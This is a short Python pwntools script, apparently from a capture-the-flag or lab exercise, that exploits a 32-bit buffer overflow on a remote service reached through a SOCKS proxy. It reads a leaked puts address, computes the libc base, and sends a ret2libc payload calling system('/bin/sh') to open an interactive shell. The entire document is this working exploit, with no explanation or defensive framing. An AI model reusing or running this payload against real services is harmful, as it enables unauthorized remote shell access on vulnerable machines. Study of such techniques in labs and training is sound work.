from pwn import *

context.proxy = (socks.SOCKS5, 'localhost', 8123) # SOCKS proxy
host = '192.168.2.99' # Remote machine name
port = '60224' # Remote port
p = remote(host, port)
offset = 128 + 12

libc_path = '/home/character/libc-2.31.so'

puts_location = int(p.recvlines(5)[2][22:].decode(), 16)
system = hex(puts_location - 0x2b130)

libc = ELF(libc_path)
libc_base = puts_location - libc.symbols['puts']

system_location = libc_base + libc.symbols['system']
bin_sh_location = libc_base + next(libc.search(b'/bin/sh'))

p.sendline(b'A' * offset + p32(system_location) + b'B' * 4 + p32(bin_sh_location))
# p.recvlines(2)
p.interactive()
